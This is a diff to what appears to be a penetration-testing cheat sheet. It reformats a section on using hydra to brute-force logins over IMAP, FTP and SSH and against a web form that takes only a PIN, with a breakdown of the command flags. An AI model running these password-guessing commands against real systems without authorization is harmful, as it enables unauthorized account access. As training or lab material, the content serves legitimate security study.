@@ -263,14 +263,16 @@ Options can be:
   hydra -L userlist.txt -p defaultpw imap://$IP/PLAIN
   hydra -l admin -p password ftp://$IP
   hydra -L logins.txt -P pws.txt -M targets.txt ssh
+```
 
-#Web-Form BruteForce: 
-    #Let's take as example a main login page accepting a pin number only for authentication http://$ip:8000/key.php which receives the input. from the user and sends it to /login.php using the name key. We will use hydra to test every possible password that can be put into the system. The command to brute force the above form is:
+##### Web-Form BruteForce: 
+Let's take as example a main login page accepting a pin number only for authentication http://$ip:8000/key.php which receives the input from the user and sends it to /login.php using the name key. We will use hydra to test every possible password that can be put into the system. 
+The command below will try one password after another in the passlist.txt file.
 
+```bash
 hydra -l '' -P passlist.txt -f -v $ip http-post-form "/login.php:key=^PASS^:Access denied" -s 8000
 
-#The command above will try one password after another in the passlist.txt file. It specifies the following:
-
+#Command breakdown:
     -l '' indicates that the login name is blank as the security lock only requires a password
     -P passlist.txt specifies the password file to use
     -f stops Hydra after finding a working password
